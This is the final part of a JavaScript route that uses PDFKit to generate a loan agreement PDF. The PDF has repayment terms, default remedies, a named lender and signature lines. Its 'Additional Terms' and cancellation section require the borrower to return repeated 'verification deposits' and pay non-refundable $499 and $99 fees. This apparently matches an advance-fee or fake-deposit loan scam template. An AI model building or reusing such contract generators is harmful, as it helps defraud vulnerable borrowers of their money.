      doc.text("• No collateral required; the Loan is unsecured.");
      doc.text(
        "• The Borrower agrees to use funds solely for lawful purposes.",
      );
      doc
        .text(
          "• Loan disbursement is contingent upon successful verification and documentation.",
        )
        .moveDown(1);

      // Section 4: Repayment & Fees
      doc
        .font("Helvetica-Bold")
        .fontSize(11)
        .text("4. Repayment & Fees")
        .moveDown(0.5);
      doc.font("Helvetica").fontSize(10);
      doc.text(`• Payments are due monthly starting from ${firstPaymentDate}.`);
      doc.text(`• Payment amount: $${monthlyPayment.toFixed(2)}.`);
      doc.text("• Payments are to be made via the designated account.");
      doc.text("• Early repayment is allowed without penalty.");
      doc.text(
        "• Interest rate: 10% annually, calculated on the outstanding balance.",
      );
      doc.text(`• Total repayment: $${totalRepayment.toFixed(2)}.`).moveDown(1);

      // Section 5: Default & Remedies
      doc
        .font("Helvetica-Bold")
        .fontSize(11)
        .text("5. Default & Remedies")
        .moveDown(0.5);
      doc.font("Helvetica").fontSize(10);
      doc.text("• Default occurs if payments are missed or terms breached.");
      doc
        .text(
          "• Remedies include acceleration of the remaining balance, legal actions, and collection costs.",
        )
        .moveDown(1);

      // Section 6: Cancellation & Fees
      doc
        .font("Helvetica-Bold")
        .fontSize(11)
        .text("6. Cancellation & Fees")
        .moveDown(0.5);
      doc.font("Helvetica").fontSize(10);
      doc.text(
        "• Cancellation after signing incurs a fee of $499 plus $99 admin fee.",
      );
      doc
        .text(
          "• No refunds of deposits or fees paid if canceled, unless explicitly stated.",
        )
        .moveDown(1);

      // Section 7: Miscellaneous
      doc
        .font("Helvetica-Bold")
        .fontSize(11)
        .text("7. Miscellaneous")
        .moveDown(0.5);
      doc.font("Helvetica").fontSize(10);
      doc.text("• Governed by laws of California.");
      doc.text("• Confidentiality applies unless legally required.");
      doc.text("• No assignment without prior consent.");
      doc.text("• If any provision is invalid, others remain in effect.");
      doc.text("• Amendments must be written and signed.").moveDown(1);

      // Additional Terms
      doc
        .font("Helvetica-Bold")
        .fontSize(11)
        .text("Additional Terms:")
        .moveDown(0.5);
      doc.font("Helvetica").fontSize(10);
      doc.text(
        "• The verification deposit may be repeated 2 or 3 times as needed, with Borrower’s agreement.",
      );
      doc.text(
        "• Borrower must return verification funds via specified methods.",
      );
      doc
        .text(
          "• Signing confirms understanding of repayment schedule, cancellation fees, and verification process.",
        )
        .moveDown(2);

      // Signatures
      doc.font("Helvetica-Bold").fontSize(11).text("Signatures").moveDown(1);

      const signatureY = doc.y;

      doc.font("Helvetica").fontSize(10);
      doc.text("Lender: _______________________", 50, signatureY);
      doc.text("Name: Albert Howard", 50, signatureY + 15);

      doc.text("Borrower: _____________________", 320, signatureY);
      doc.text(`Name: ${fullName}`, 320, signatureY + 15);

      doc.moveDown(3);
      doc.x = 50;
      doc
        .font("Helvetica-Oblique")
        .fontSize(9)
        .text(
          "Acknowledgment:\nBy signing, Borrower agrees to the terms, including the verification process, repayment schedule, and cancellation fees.",
        );

      doc.end();
    } catch (error) {
      console.error("PDF Generation Error:", error);
      res.status(500).send("Error generating agreement PDF");
    }
  },
);

export default router;
